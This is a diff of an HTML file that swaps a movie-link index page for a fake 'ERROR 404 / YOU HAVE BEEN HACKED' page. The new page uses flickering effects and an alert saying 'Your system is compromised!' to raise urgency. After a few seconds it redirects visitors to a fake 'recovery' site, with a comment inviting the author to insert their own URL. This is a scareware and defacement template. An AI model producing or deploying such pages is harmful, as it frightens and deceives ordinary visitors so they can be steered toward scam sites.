@@ -3,37 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>INDEX</title>
-    
+    <title>Error Page - Hacked</title>
     <style>
-        /* Inline CSS for styling the links as subheadings */
-        .post-link {
-            text-decoration: none; /* Remove underline */
-            font-size: 1em; /* Increase font size to look like a subheading */
-            color: #0000ff; /* Set a color for the subheadings */
-            display: block; /* Make the link fill the space like a block element */
-            margin: 10px 0; /* Add some margin for spacing */
+        /* Basic styling for the error/hacked look */
+        body {
+            background-color: black;
+            color: red;
+            font-family: "Courier New", Courier, monospace;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 100vh;
         }
 
-        .post-link:hover {
-            color: #800080; /* Optional: Change color on hover */
+        h1 {
+            font-size: 4em;
+            text-shadow: 0 0 10px red;
+            animation: glitch 1s infinite alternate;
         }
+
+        h2 {
+            font-size: 2em;
+            text-shadow: 0 0 10px red;
+            animation: flicker 1.5s infinite;
+        }
+
+        .warning {
+            color: lime;
+            margin-top: 20px;
+            font-size: 1.5em;
+            animation: flicker 2s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0, 0); }
+            20% { transform: translate(-10px, 10px); }
+            40% { transform: translate(10px, -10px); }
+            60% { transform: translate(-10px, -10px); }
+            80% { transform: translate(10px, 10px); }
+            100% { transform: translate(0, 0); }
+        }
+
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
     </style>
 </head>
 <body>
-    
-    <main>
-        <h1>AKLINKSZ INDEX</h1>
-        <ul id="Alphabet-List">
-    <li><a href="../Dubbed-Movie-Series-Tamil.html" class="post-link">DUBBED MOVIE SERIES ᵀᴬᴹᴵᴸ"</a></li>
-    <li><a href="../Dubbed-Solo-Movies.html" class="post-link">DUBBED SOLO MOVIE'S ᵀᴬᴹᴵᴸ</a></li>
-</ul>
+    <h1>ERROR 404</h1>
+    <h2>YOU HAVE BEEN HACKED</h2>
+    <p class="warning">Contact system administrator immediately!</p>
 
-    </main>
+    <script>
+        // Basic JavaScript to add more effect to the hacked appearance
+        setTimeout(() => {
+            alert("Your system is compromised!");  // Pop-up message to increase urgency
+        }, 3000);
 
-    <footer>
-        <div>© 2024 My Blog. All Rights Reserved.</div>
-    </footer>
-   
+        // Redirect to a fake "recovery" site after a few seconds
+        setTimeout(() => {
+            window.location.href = "https://yourrecoverysite.com";  // Change this URL to your own
+        }, 8000);
+
+        // Flashing text effect
+        setInterval(() => {
+            document.body.style.backgroundColor = document.body.style.backgroundColor === 'black' ? 'darkred' : 'black';
+        }, 500);
+    </script>
 </body>
 </html>
